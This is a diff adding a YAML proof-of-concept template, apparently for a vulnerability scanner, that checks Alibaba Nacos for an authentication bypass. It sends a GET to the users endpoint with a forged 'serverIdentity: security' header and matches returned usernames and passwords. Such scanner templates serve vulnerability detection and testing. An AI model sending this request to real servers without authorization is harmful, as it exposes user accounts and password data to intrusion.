@@ -1,0 +1,26 @@
+id: poc-yaml-nacos-noauth-bypass
+info:
+  name: Alibaba Nacos ServerIdentity 权限绕过漏洞
+  severity: high
+  finger: Nacos
+  tags:
+  - 两高一弱
+  - 未授权访问
+requests:
+- method: GET
+  path: /nacos/v1/auth/users?pageNo=1&pageSize=10&search=accurate&accessToken=
+  headers:
+    serverIdentity: security
+  expression: 'contains(content_type, "application/json") &&
+
+    contains(body, "\"totalCount\"") &&
+
+    contains(body, "\"pageItems\"") &&
+
+    matches(body,"\"username\":\"([0-9a-zA-Z]+)\"") &&
+
+    matches(body,"\"password\":\"(\\S+)\"")
+
+    '
+variables: {}
+transport: http
